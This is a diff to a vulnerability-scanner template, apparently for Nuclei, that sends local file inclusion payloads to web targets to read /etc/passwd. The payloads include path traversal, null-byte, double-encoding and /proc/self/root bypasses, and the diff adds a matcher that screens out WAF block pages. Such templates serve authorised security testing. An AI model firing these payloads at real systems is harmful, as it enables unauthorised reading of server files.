@@ -1,39 +1,19 @@
 id: K70n0s510-lfi-linux-godmode
 info:
-  name: Linux LFI God Mode (Multi-Bypass)
+  name: Linux LFI God Mode
   author: K70n0s510
   severity: high
-  description: Tries 5 different LFI techniques to read /etc/passwd.
   tags: lfi,linux,fuzz
 http:
   - method: GET
     path:
-      - "{{BaseURL}}/?file=../../../../etc/passwd"                  # Standard
-      - "{{BaseURL}}/?file=../../../../etc/passwd%00"              # Null Byte
-      - "{{BaseURL}}/?file=....//....//....//etc/passwd"           # Filter Evasion
-      - "{{BaseURL}}/?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd" # Double Encode
-      - "{{BaseURL}}/?path=/proc/self/root/etc/passwd"             # Proc Bypass
-      - "{{BaseURL}}/static/..%2f..%2f..%2fetc/passwd"             # Nginx Off-by-slash
-
-    matchers-condition: or
+      - "{{BaseURL}}/?file=../../../../etc/passwd"
+      - "{{BaseURL}}/?file=../../../../etc/passwd%00"
+      - "{{BaseURL}}/?path=/proc/self/root/etc/passwd"
+    matchers-condition: and
     matchers:
       - type: regex
-        part: body
-        name: root-regex
         regex: ["root:.*:0:0:"]
       - type: word
-        part: body
-        name: daemon-user
-        words: ["daemon:x:1:1:"]
-      - type: word
-        part: body
-        name: nobody-user
-        words: ["nobody:x:65534:65534:"]
-      - type: word
-        part: body
-        name: bin-bash
-        words: ["/bin/bash"]
-      - type: word
-        part: body
-        name: debian-header
-        words: ["/home/debian"]
+        words: ["AkamaiGHost", "Access Denied", "Cloudflare"]
+        negative: true
